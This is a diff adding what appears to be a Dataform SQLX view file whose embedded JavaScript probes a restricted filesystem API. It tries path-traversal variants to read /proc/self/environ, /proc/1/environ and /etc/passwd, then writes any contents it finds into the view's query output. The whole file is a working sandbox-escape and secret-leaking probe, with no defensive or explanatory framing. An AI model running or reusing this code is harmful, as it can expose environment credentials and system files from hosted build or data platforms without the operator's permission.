@@ -1,0 +1,51 @@
+config { type: "view", name: "v8_proc_test" }
+
+js {
+  let results = [];
+
+  // Test various path tricks to access /proc
+  const paths = [
+    '/proc/self/environ',
+    '/proc/self/cmdline',
+    '/proc/self/status',
+    '/proc/1/environ',
+    '../../../../../../proc/self/environ',
+    '../../../../../../../proc/self/environ',
+    '../../../../../../../../proc/self/environ',
+    './proc/self/environ',
+  ];
+
+  for (const p of paths) {
+    try {
+      const exists = restricted_fs.exists(p);
+      results.push(p.substring(0,30) + '_exists: ' + exists);
+      if (exists) {
+        const content = restricted_fs.readFile(p);
+        results.push(p.substring(0,30) + '_content: ' + content.substring(0, 100));
+      }
+    } catch(e) {
+      results.push(p.substring(0,30) + '_error: ' + e.message.substring(0, 50));
+    }
+  }
+
+  // Also test if we can list root directory
+  try {
+    const isDir = restricted_fs.isDirectory('/');
+    results.push('root_isDir: ' + isDir);
+  } catch(e) {
+    results.push('root_error: ' + e.message.substring(0, 50));
+  }
+
+  // Try to read /etc/passwd
+  try {
+    const exists = restricted_fs.exists('/etc/passwd');
+    results.push('etc_passwd_exists: ' + exists);
+    if (exists) {
+      results.push('etc_passwd: ' + restricted_fs.readFile('/etc/passwd').substring(0, 100));
+    }
+  } catch(e) {
+    results.push('etc_passwd_error: ' + e.message.substring(0, 50));
+  }
+}
+
+SELECT '${JSON.stringify(results)}' as proc_results
